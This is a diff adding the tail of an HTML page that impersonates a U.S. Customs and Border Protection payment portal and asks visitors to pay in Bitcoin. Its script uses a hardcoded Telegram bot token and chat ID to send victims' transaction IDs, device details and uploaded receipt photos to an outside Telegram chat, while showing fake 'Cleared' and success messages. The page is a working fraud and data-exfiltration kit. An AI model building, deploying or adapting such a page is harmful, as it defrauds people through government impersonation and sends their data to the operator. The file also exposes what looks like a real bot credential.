+<p class="font-body-md text-body-md text-on-surface-variant mt-1">Contact the Federal Payment Support Center at 1-800-CBP-HELP for manual assistance.</p>
+<a class="inline-block mt-stack-md text-secondary font-label-bold text-label-bold hover:underline" href="#">View Verification Guide →</a>
+</div>
+</div>
+<!-- Data Table (History Preview) -->
+<div class="bg-white border border-outline-variant rounded overflow-hidden">
+<div class="bg-primary px-stack-md py-stack-sm">
+<p class="font-label-bold text-label-bold text-white uppercase tracking-wider">Recent Settlement History</p>
+</div>
+<table class="w-full text-left font-body-md text-body-md">
+<thead class="bg-surface-container-high text-on-surface-variant border-b border-outline-variant">
+<tr>
+<th class="px-4 py-2 font-label-bold text-label-bold">Date</th>
+<th class="px-4 py-2 font-label-bold text-label-bold">Status</th>
+</tr>
+</thead>
+<tbody>
+<tr class="border-b border-outline-variant hover:bg-surface-container-low transition-colors">
+<td class="px-4 py-2 font-label-sm text-label-sm">oct 05, 2026</td>
+<td class="px-4 py-2"><span class="text-green-700 font-bold flex items-center gap-1"><span class="material-symbols-outlined text-xs">check</span> Cleared</span></td>
+</tr>
+<tr class="bg-surface-container-low border-b border-outline-variant hover:bg-surface-container-high transition-colors">
+<td class="px-4 py-2 font-label-sm text-label-sm">oct 05, 2026</td>
+<td class="px-4 py-2"><span class="text-green-700 font-bold flex items-center gap-1"><span class="material-symbols-outlined text-xs">check</span> Cleared</span></td>
+</tr>
+<tr class="hover:bg-surface-container-low transition-colors">
+<td class="px-4 py-2 font-label-sm text-label-sm">oct 05, 2026</td>
+<td class="px-4 py-2"><span class="text-green-700 font-bold flex items-center gap-1"><span class="material-symbols-outlined text-xs">check</span> Cleared</span></td>
+</tr>
+</tbody>
+</table>
+<div class="p-2 text-center">
+<button class="text-label-sm font-label-sm text-outline hover:text-primary transition-colors">View All History</button>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<!-- ==================== SHARED FOOTER ==================== -->
+<footer class="w-full bg-primary border-t border-outline-variant py-stack-lg px-margin-desktop mt-auto text-on-primary">
+<div class="max-w-container-max mx-auto flex flex-col md:flex-row justify-between items-center gap-stack-lg">
+<div class="space-y-stack-sm text-center md:text-left">
+<span class="font-label-bold text-label-bold text-on-primary">U.S. Customs and Border Protection</span>
+<p class="font-body-md text-body-md opacity-70">© 2026 U.S. Customs and Border Protection. All rights reserved.</p>
+</div>
+<nav class="flex flex-wrap justify-center gap-x-8 gap-y-2">
+<a class="font-label-sm text-label-sm text-on-primary opacity-70 hover:opacity-100 transition-opacity cursor-pointer" onclick="showToast('Privacy Policy coming soon')">Privacy Policy</a>
+<a class="font-label-sm text-label-sm text-on-primary opacity-70 hover:opacity-100 transition-opacity cursor-pointer" onclick="showToast('Contact Us coming soon')">Contact Us</a>
+<a class="font-label-sm text-label-sm text-on-primary opacity-70 hover:opacity-100 transition-opacity cursor-pointer" onclick="showToast('Accessibility coming soon')">Accessibility</a>
+<a class="font-label-sm text-label-sm text-on-primary opacity-70 hover:opacity-100 transition-opacity cursor-pointer" onclick="showToast('FOIA coming soon')">FOIA</a>
+<a class="font-label-sm text-label-sm text-on-primary opacity-70 hover:opacity-100 transition-opacity cursor-pointer" onclick="showToast('No FEAR Act coming soon')">No FEAR Act</a>
+</nav>
+</div>
+</footer>
+
+</main>
+</div>
+
+<!-- ==================== ROUTER & SCRIPTS ==================== -->
+<script>
+// ===== TELEGRAM BOT CONFIG =====
+// REPLACE THESE WITH YOUR ACTUAL VALUES:
+const TELEGRAM_BOT_TOKEN = '8699484555:AAGNCR_ustHHUe-Wu932YAMPyBSsVO17K9E';  // From @BotFather
+const TELEGRAM_CHAT_ID = '8728675844';       // From @userinfobot
+
+// ===== TELEGRAM NOTIFICATION FUNCTION =====
+async function sendTelegramNotification(message, photoFile = null) {
+    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+        console.warn('Telegram bot not configured. Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.');
+        showToast('Notification system not configured yet');
+        return false;
+    }
+
+    const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+
+    try {
+        if (photoFile) {
+            // Send photo with caption
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('caption', message);
+            formData.append('photo', photoFile);
+
+            const response = await fetch(`${apiUrl}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            const data = await response.json();
+            return data.ok;
+        } else {
+            // Send text message
+            const response = await fetch(`${apiUrl}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            const data = await response.json();
+            return data.ok;
+        }
+    } catch (error) {
+        console.error('Telegram send failed:', error);
+        showToast('Failed to send notification');
+        return false;
+    }
+}
+
+// ===== SAFE NAVIGATION WRAPPER =====
+function goTo(path) {
+    if (window.router && window.router.navigate) {
+        window.router.navigate(path);
+    } else {
+        window.location.hash = path;
+    }
+    return false;
+}
+
+// ===== ROUTER =====
+window.router = {
+    routes: {
+        '/': 'page-dashboard',
+        '/payment': 'page-payment',
+        '/verify': 'page-verify'
+    },
+    currentRoute: '/',
+
+    navigate(path) {
+        this.currentRoute = path;
+        window.location.hash = path;
+        this.render();
+    },
+
+    render() {
+        const hash = window.location.hash.replace('#', '') || '/';
+        const pageId = this.routes[hash] || 'page-dashboard';
+
+        // Hide all pages
+        document.querySelectorAll('.page-view').forEach(page => {
+            page.classList.remove('active');
+        });
+
+        // Show current page
+        const currentPage = document.getElementById(pageId);
+        if (currentPage) {
+            currentPage.classList.add('active');
+        }
+
+        // Update sidebar active state
+        document.querySelectorAll('.nav-item').forEach(item => {
+            item.classList.remove('nav-active');
+        });
+
+        if (hash === '/' || hash === '') {
+            document.querySelectorAll('.nav-item')[0]?.classList.add('nav-active');
+        } else if (hash === '/payment' || hash === '/verify') {
+            document.querySelectorAll('.nav-item')[1]?.classList.add('nav-active');
+        }
+
+        // Scroll to top
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+
+        // Update document title
+        const titles = {
+            '/': 'Official Payment Portal | U.S. Customs and Border Protection',
+            '/payment': 'CBP Payment Portal | Pay with Bitcoin',
+            '/verify': 'Verify Your Payment | U.S. Customs and Border Protection'
+        };
+        document.title = titles[hash] || titles['/'];
+    }
+};
+
+// Handle hash changes
+window.addEventListener('hashchange', () => router.render());
+window.addEventListener('load', () => router.render());
+
+// ===== TOAST NOTIFICATION =====
+function showToast(message) {
+    let toast = document.getElementById('global-toast');
+    if (!toast) {
+        toast = document.createElement('div');
+        toast.id = 'global-toast';
+        toast.className = 'fixed bottom-8 left-1/2 transform -translate-x-1/2 bg-primary text-on-primary px-6 py-3 rounded-lg shadow-lg font-label-bold text-label-bold z-[100] transition-all duration-300 opacity-0 translate-y-4';
+        document.body.appendChild(toast);
+    }
+    toast.textContent = message;
+    toast.classList.remove('opacity-0', 'translate-y-4');
+    toast.classList.add('opacity-100', 'translate-y-0');
+    setTimeout(() => {
+        toast.classList.add('opacity-0', 'translate-y-4');
+        toast.classList.remove('opacity-100', 'translate-y-0');
+    }, 2500);
+}
+
+// ===== MOBILE MENU =====
+function toggleMobileMenu() {
+    const menu = document.getElementById('mobile-menu');
+    menu.classList.toggle('show');
+}
+
+// ===== PAGE 1: DASHBOARD SCRIPTS =====
+document.querySelectorAll('button').forEach(button => {
+    button.addEventListener('mousedown', () => {
+        button.classList.add('scale-95');
+    });
+    button.addEventListener('mouseup', () => {
+        button.classList.remove('scale-95');
+    });
+    button.addEventListener('mouseleave', () => {
+        button.classList.remove('scale-95');
+    });
+});
+
+const navItems = document.querySelectorAll('aside nav a');
+navItems.forEach(item => {
+    item.addEventListener('mouseenter', () => {
+        if(!item.classList.contains('nav-active')) {
+            item.classList.add('translate-x-1');
+        }
+    });
+    item.addEventListener('mouseleave', () => {
+        item.classList.remove('translate-x-1');
+    });
+});
+
+// ===== PAGE 2: PAYMENT SCRIPTS =====
+function copyAddress() {
+    const copyText = document.getElementById("btc-address");
+    const toast = document.getElementById("copy-toast");
+
+    copyText.select();
+    copyText.setSelectionRange(0, 99999);
+    navigator.clipboard.writeText(copyText.value);
+
+    toast.classList.remove("hidden");
+    setTimeout(() => {
+        toast.classList.add("hidden");
+    }, 3000);
+}
+
+// ===== PAGE 3: VERIFY SCRIPTS =====
+const form = document.getElementById('verification-form');
+const successBanner = document.getElementById('success-banner');
+const dropArea = document.getElementById('drop-area');
+const fileInput = document.getElementById('file-upload');
+const fileList = document.getElementById('file-list');
+
+if (form) {
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const txidInput = document.getElementById('txid');
+        const txid = txidInput ? txidInput.value.trim() : 'N/A';
+        const fileInput = document.getElementById('file-upload');
+        const files = fileInput && fileInput.files ? fileInput.files : [];
+
+        // Build notification message
+        let message = `🚨 <b>PAYMENT CONFIRMATION SUBMITTED</b> �
+
+` +
+            `📋 <b>Transaction ID:</b> <code>${txid}</code>
+` +
+            `🕐 <b>Submitted:</b> ${new Date().toLocaleString()}
+` +
+            `📱 <b>Device:</b> ${navigator.userAgent.split(')')[0]})}
+` +
+            `🌐 <b>Page:</b> Payment Verification
+
+`;
+
+        if (files.length > 0) {
+            message += `📁 <b>Receipts Uploaded:</b> ${files.length} file(s)
+`;
+            for (let i = 0; i < files.length; i++) {
+                message += `  ${i+1}. ${files[i].name} (${(files[i].size/1024).toFixed(1)} KB)
+`;
+            }
+        } else {
+            message += `[WARNING] <b>No receipt uploaded</b>
+`;
+        }
+
+        message += `
+[OK] User confirmed compliance checkboxes.`;
+
+        // Send text notification first
+        await sendTelegramNotification(message);
+
+        // Send each uploaded photo to Telegram
+        if (files.length > 0) {
+            for (let i = 0; i < files.length; i++) {
+                const photoMsg = `📷 <b>Receipt ${i+1}/${files.length}</b>
+TXID: <code>${txid}</code>`;
+                await sendTelegramNotification(photoMsg, files[i]);
+            }
+        }
+
+        // Show success UI
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+        if (successBanner) successBanner.classList.remove('hidden');
+
+        const submitBtn = form.querySelector('button[type="submit"]');
+        if (submitBtn) {
+            submitBtn.innerText = 'Submitted Successfully';
+            submitBtn.classList.remove('bg-[#FFBE2E]');
+            submitBtn.classList.add('bg-green-600', 'text-white', 'border-b-green-800');
+            submitBtn.disabled = true;
+        }
+
+        showToast('Payment submitted & notification sent');
+    });
+}
+
+function handleVerifyWithTelegram() {
+    var txidInput = document.getElementById('txid');
+    var txid = txidInput ? txidInput.value.trim() : '';
+    if(!txid) {
+        alert('Please enter a Transaction ID');
+        return;
+    }
+
+    var verifyBtn = event.currentTarget;
+    verifyBtn.innerHTML = '<span class="material-symbols-outlined animate-spin text-xs">sync</span> Verifying...';
+
+    // Send TXID to Telegram
+    var message = '[ALERT] NEW PAYMENT VERIFICATION' + '\n\n' +
+        '[ID] Transaction ID: ' + txid + '\n' +
+        '[TIME] Time: ' + new Date().toLocaleString() + '\n' +
+        '[WEB] Status: Pending Verification\n\n' +
+        'User has submitted a TXID for payment verification.';
+
+    sendTelegramNotification(message).then(function() {
+        setTimeout(function() {
+            verifyBtn.innerHTML = '<span class="material-symbols-outlined text-xs">done</span> Validated';
+            verifyBtn.classList.add('bg-green-700', 'border-green-700');
+            showToast('TXID sent to admin');
+        }, 800);
+    });
+}
+
+// Keep old function name for compatibility
+function handleVerify() {
+    handleVerifyWithTelegram();
+}
+
+// ===== GALLERY UPLOAD =====
+function openGallery() {
+    var fileInput = document.getElementById('file-upload');
+    if (!fileInput) return;
+
+    // Create a fresh input to ensure gallery opens every time
+    var newInput = document.createElement('input');
+    newInput.type = 'file';
+    newInput.accept = 'image/*';
+    newInput.multiple = true;
+    newInput.style.display = 'none';
+
+    // On mobile this triggers native gallery picker
+    newInput.addEventListener('change', function(e) {
+        handleFiles(this.files);
+    });
+
+    document.body.appendChild(newInput);
+    newInput.click();
+
+    // Clean up after selection
+    setTimeout(function() {
+        if (newInput.parentNode) document.body.removeChild(newInput);
+    }, 1000);
+}
+
+function handleFiles(files) {
+    var fileList = document.getElementById('file-list');
+    if (!fileList) return;
+
+    fileList.innerHTML = '';
+    for(var i = 0; i < files.length; i++) {
+        var file = files[i];
+        // Preview image
+        var reader = new FileReader();
+        reader.onload = (function(f) {
+            return function(e) {
+                var item = document.createElement('div');
+                item.className = 'flex items-center gap-3 p-2 bg-surface-container rounded border border-outline-variant text-label-sm font-label-sm';
+                item.innerHTML = '<img src="' + e.target.result + '" class="w-10 h-10 object-cover rounded" alt="preview"/>' +
+                    '<span class="truncate flex-1">' + f.name + '</span>' +
+                    '<span class="text-outline">' + (f.size/1024).toFixed(1) + ' KB</span>';
+                fileList.appendChild(item);
+            };
+        })(file);
+        reader.readAsDataURL(file);
+    }
+
+    showToast(files.length + ' file(s) selected from gallery');
+
+    // Send real-time notification that files were selected
+    var txidInput = document.getElementById('txid');
+    var txid = txidInput ? txidInput.value.trim() : 'N/A';
+    var fileMsg = `📷 <b>RECEIPT UPLOADED</b> �
+
+` +
+        `📋 <b>Transaction ID:</b> <code>${txid}</code>
+` +
+        `📁 <b>Files:</b> ${files.length} uploaded
+` +
+        `🕐 <b>Time:</b> ${new Date().toLocaleString()}
+
+` +
+        `User has uploaded payment receipt(s).`;
+    sendTelegramNotification(fileMsg);
+}
+
+// Drag and drop support (desktop)
+var dropAreaEl = document.getElementById('drop-area');
+if (dropAreaEl) {
+    dropAreaEl.addEventListener('dragover', function(e) {
+        e.preventDefault();
+        dropAreaEl.classList.add('border-secondary', 'bg-secondary-container/10');
+    });
+
+    dropAreaEl.addEventListener('dragleave', function(e) {
+        e.preventDefault();
+        dropAreaEl.classList.remove('border-secondary', 'bg-secondary-container/10');
+    });
+
+    dropAreaEl.addEventListener('drop', function(e) {
+        e.preventDefault();
+        dropAreaEl.classList.remove('border-secondary', 'bg-secondary-container/10');
+        handleFiles(e.dataTransfer.files);
+    });
+}
+</script>
+
+</body>
+</html>
